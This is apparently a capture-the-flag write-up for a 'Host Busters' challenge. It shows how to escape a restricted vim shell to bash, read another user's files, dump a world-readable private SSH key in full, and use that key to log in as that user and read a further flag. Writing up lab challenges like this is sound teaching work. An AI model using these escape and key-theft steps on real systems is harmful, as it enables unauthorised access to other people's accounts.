# Host Busters 1 (50 points)
Turbo Tactical has gained access to a DEADFACE machine that belongs to `gh0st404`. This machine was used to scan one of TGRI’s websites. See if you can find anything useful in the `vim` user’s directory.

On a side note, it’s also a good idea to collect anything you think might be useful in the future for going after DEADFACE.

Submit the flag as `flag{flag_here}`.

`vim@gh0st404.deadface.io`

Password: letmevim

## Solution
If we access the server with ssh we are trapped inside a vim session. But in vim u can easily start a terminal with the command `:terminal`. We the shell we can read out the flag file in our home directory:
![Flag](./images/host_busters.png)

## Extra
In vim are the mouse controls activated. We can disable them with the command `:set mouse=`. After that we can also copy from the terminal.

To get a full shell we can just call /bin/bash. Then we can examine the other home directories. In the directory of `gh0st404` we find a private ssh key:
```
$ /bin/bash
vim@a3f3ce1919ac:/home$ ls -al
total 28
drwxrwxr-x 1 root      root      4096 Jul 29 23:05 .
drwxr-xr-x 1 root      root      4096 Oct 21 10:42 ..
drwxrwxr-x 1 gh0st404  gh0st404  4096 Jul 31 02:24 gh0st404
drwxrwxr-x 1 mort1cia  mort1cia  4096 Jul 29 23:05 mort1cia
drwxrwxr-x 1 spookyboi spookyboi 4096 Jul 31 02:24 spookyboi
drwxrwxr-x 1 vim       vim       4096 Oct 21 11:00 vim
vim@a3f3ce1919ac:/home$ cd gh0st404/
vim@a3f3ce1919ac:/home/gh0st404$ ls -al
total 64
drwxrwxr-x 1 gh0st404 gh0st404  4096 Jul 31 02:24 .
drwxrwxr-x 1 root     root      4096 Jul 29 23:05 ..
-rw------- 1 gh0st404 gh0st404   214 Jul 29 23:02 .bash_history
-rw-r--r-- 1 gh0st404 gh0st404   220 Apr 23 21:23 .bash_logout
-rw-r--r-- 1 gh0st404 gh0st404  3526 Apr 23 21:23 .bashrc
drwxrwxr-x 1 gh0st404 gh0st404  4096 Jul 29 23:05 .keys
-rw-r--r-- 1 gh0st404 gh0st404   807 Apr 23 21:23 .profile
drwx------ 1 gh0st404 gh0st404  4096 Jul 29 23:05 .ssh
-rw-rw-r-- 1 gh0st404 gh0st404    47 Jul 29 23:05 config
-rw------- 1 gh0st404 gh0st404    34 Jul 29 23:05 hostbusters3.txt
-rw-rw-r-- 1 gh0st404 gh0st404  2610 Jul 29 23:05 id_rsa
-rw-r--r-- 1 gh0st404 gh0st404   958 Jul 29 23:05 tgri-alive.xml
-rw-r--r-- 1 gh0st404 gh0st404 11650 Jul 29 23:05 tgri-scan.xml
vim@a3f3ce1919ac:/home/gh0st404$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
vim@a3f3ce1919ac:/home/gh0st404$
```

If we use this key we can log in via ssh with the user:
```
vim@25debd5e0e7b:/home/gh0st404$ ssh -i id_rsa gh0st404@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:0mHE5uZoBUeZWuf9AnEP42DxVfDI1xhTG1X1f5exMwg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Linux 25debd5e0e7b 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st404@25debd5e0e7b:~$ id
uid=1003(gh0st404) gid=1003(gh0st404) groups=1003(gh0st404),1004(deadface)
gh0st404@25debd5e0e7b:~$
```

Now we can read out the file `hostbusters3.txt` and get another flag:
```
gh0st404@25debd5e0e7b:~$ ls -al
total 64
drwxrwxr-x 1 gh0st404 gh0st404  4096 Jul 31 02:24 .
drwxrwxr-x 1 root     root      4096 Jul 29 23:05 ..
-rw------- 1 gh0st404 gh0st404   214 Jul 29 23:02 .bash_history
-rw-r--r-- 1 gh0st404 gh0st404   220 Apr 23 21:23 .bash_logout
-rw-r--r-- 1 gh0st404 gh0st404  3526 Apr 23 21:23 .bashrc
drwxrwxr-x 1 gh0st404 gh0st404  4096 Jul 29 23:05 .keys
-rw-r--r-- 1 gh0st404 gh0st404   807 Apr 23 21:23 .profile
drwx------ 1 gh0st404 gh0st404  4096 Jul 29 23:05 .ssh
-rw-rw-r-- 1 gh0st404 gh0st404    47 Jul 29 23:05 config
-rw------- 1 gh0st404 gh0st404    34 Jul 29 23:05 hostbusters3.txt
-rw-rw-r-- 1 gh0st404 gh0st404  2610 Jul 29 23:05 id_rsa
-rw-r--r-- 1 gh0st404 gh0st404   958 Jul 29 23:05 tgri-alive.xml
-rw-r--r-- 1 gh0st404 gh0st404 11650 Jul 29 23:05 tgri-scan.xml
gh0st404@25debd5e0e7b:~$ cat hostbusters3.txt
flag{Embr4c3_th3_K3y_t0_5ucc355!}
gh0st404@25debd5e0e7b:~$
```

Probably for another challenge.

As well we find some more keys:
```
gh0st404@25debd5e0e7b:~$ ls -al .keys/
total 16
drwxrwxr-x 1 gh0st404 gh0st404 4096 Jul 29 23:05 .
drwxrwxr-x 1 gh0st404 gh0st404 4096 Jul 31 02:24 ..
-rw-rw-r-- 1 gh0st404 gh0st404 1074 Jul 29 23:05 gh0st404-priv.pem
-rw-rw-r-- 1 gh0st404 gh0st404  272 Jul 29 23:05 gh0st404-public.pem
gh0st404@25debd5e0e7b:~$
```